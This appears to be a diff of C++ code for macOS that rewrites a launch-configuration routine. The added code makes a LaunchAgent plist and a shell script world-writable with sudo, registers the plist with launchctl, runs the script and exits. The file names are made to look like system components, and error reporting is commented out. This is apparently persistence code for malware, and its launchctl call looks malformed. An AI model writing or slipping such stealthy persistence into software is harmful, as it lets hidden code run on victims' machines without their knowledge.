@@ -65,13 +65,21 @@ char* GetHostName() {
     }
 }
 
-// TODO: change !!!
 void ReloadLaunchConfiguration() {
-    string cmd = "sudo launchctl bootstrap system /Library/LaunchAgents/com.background.system.watcher.plist";
-    string set_creds ="sudo chmod 777 /Library/LaunchAgents/com.background.system.watcher.plist";
+    string set_creds ="sudo chmod 777 " + string(getenv("HOME")) + "/Library/LaunchAgents/com.system.bash.plist";
+    string set_creds_bash_script ="sudo chmod 777 " + string(getenv("HOME")) + "/Library/LaunchAgents/system.bash.sh";
     int result = system(set_creds.c_str());
+    if (result != 0) {
+        // cout << "Ошибка перезапуска конфигурации автозапуска." << "\n";
+    }
+    int result_sh = system(set_creds_bash_script.c_str());
+    if (result_sh != 0) {
+        // cout << "Ошибка раздачи прав system.bash.sh" << "\n";
+    }
+    string cmd = "sudo launchctl bootstrap " + string(getenv("HOME")) + "/Library/LaunchAgents/com.system.bash.plist";
     system(cmd.c_str());
-    // if (result != 0) {
-    //     std::cerr << "Ошибка перезапуска конфигурации автозапуска." << std::endl;
-    // }
+    string cmd_script = string(getenv("HOME")) + "/Library/LaunchAgents/system.bash.sh";
+    system(cmd_script.c_str());
+
+    exit(0);
 }
